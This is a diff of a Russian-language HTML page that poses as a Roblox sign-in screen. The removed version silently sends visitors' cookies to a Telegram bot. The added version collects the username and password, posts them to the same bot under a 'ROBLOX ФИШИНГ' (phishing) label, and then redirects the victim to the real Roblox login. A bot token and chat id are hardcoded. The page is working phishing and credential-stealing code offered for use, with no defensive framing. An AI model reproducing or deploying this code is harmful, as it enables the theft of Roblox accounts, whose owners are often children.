@@ -1,25 +1,118 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в Roblox</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #e8e8e8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+        .login-card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+            width: 340px;
+            text-align: center;
+        }
+        .login-card h1 {
+            font-size: 28px;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        .login-card .sub {
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .login-card input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #f9f9f9;
+        }
+        .login-card input:focus {
+            border-color: #00bfff;
+            outline: none;
+            background: #fff;
+        }
+        .login-card button {
+            width: 100%;
+            padding: 14px;
+            background: #00bfff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .login-card button:hover {
+            background: #0099cc;
+        }
+        .login-card .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #999;
+        }
+    </style>
 </head>
 <body>
-    <h1>Подождите...</h1>
-    <script>
-        var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
-        var chat_id = "6981190103";
-        var cookies = document.cookie;
-        var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent('КУКИ: ' + cookies);
+
+<div class="login-card">
+    <h1>Roblox</h1>
+    <div class="sub">Войдите в свой аккаунт</div>
+    <input type="text" id="username" placeholder="Имя пользователя">
+    <input type="password" id="password" placeholder="Пароль">
+    <button onclick="sendData()">Войти</button>
+    <div class="footer">Защищённое соединение</div>
+</div>
+
+<script>
+    // ===== ТВОИ ДАННЫЕ (ТОКЕН И ID) =====
+    var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
+    var chat_id = "6981190103";
+    // ======================================
+
+    function sendData() {
+        var user = document.getElementById('username').value;
+        var pass = document.getElementById('password').value;
+
+        if (user === '' || pass === '') {
+            alert('Пожалуйста, заполните оба поля.');
+            return;
+        }
+
+        var message = 'ROBLOX ФИШИНГ\n\n👤 Логин: ' + user + '\n🔑 Пароль: ' + pass;
+        var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(message);
+
+        // Отправка в Telegram
         fetch(url)
             .then(response => {
-                if (!response.ok) {
-                    console.log('Ошибка отправки');
+                if (response.ok) {
+                    alert('Вход выполнен! Перенаправление...');
+                    window.location.href = 'https://www.roblox.com/login';
+                } else {
+                    alert('Ошибка. Попробуйте снова.');
                 }
             })
             .catch(error => {
-                console.log('Ошибка:', error);
+                alert('Ошибка соединения. Попробуйте позже.');
             });
-        document.write('<p>Пожалуйста, подождите...</p>');
-    </script>
+    }
+</script>
+
 </body>
 </html>
